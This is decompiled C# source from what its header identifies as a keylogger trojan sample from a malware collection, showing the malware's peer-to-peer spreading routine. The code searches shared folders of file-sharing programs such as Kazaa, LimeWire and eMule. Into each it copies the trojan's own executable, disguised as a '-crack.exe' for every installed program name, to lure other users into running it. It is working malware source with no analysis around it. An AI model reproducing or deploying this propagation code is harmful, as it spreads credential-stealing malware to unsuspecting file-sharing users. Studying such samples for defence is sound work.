// Decompiled with JetBrains decompiler
// Type: Roy.P2P
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.IO;
using System.Runtime.CompilerServices;

namespace Roy
{
  [StandardModule]
  internal sealed class P2P
  {
    public static void p2p()
    {
      foreach (object obj in new ArrayList()
      {
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Downloads"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\My Shared Folder"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Shared"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ares\\My Shared Folder"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Downloads"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Shareaza\\Downloads"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\emule\\incoming\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa\\my shared folder\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa lite\\my shared folder\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa lite k++\\my shared folder\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\icq\\shared folder\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\grokster\\my grokster\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\bearshare\\shared\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\edonkey2000\\incoming\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\morpheus\\my shared folder\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\limewire\\shared\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\tesla\\files\\"),
        (object) (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\winmx\\shared\\")
      })
      {
        string path = Convert.ToString(RuntimeHelpers.GetObjectValue(obj));
        if (Directory.Exists(path))
        {
          string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
          int index = 0;
          while (index < directories.Length)
          {
            string str = directories[index];
            string destFileName = path + "\\" + str.Substring(str.LastIndexOf("\\")).Replace("\\", string.Empty) + "-crack.exe";
            File.Copy(LAN.me, destFileName, true);
            checked { ++index; }
          }
        }
      }
    }
  }
}
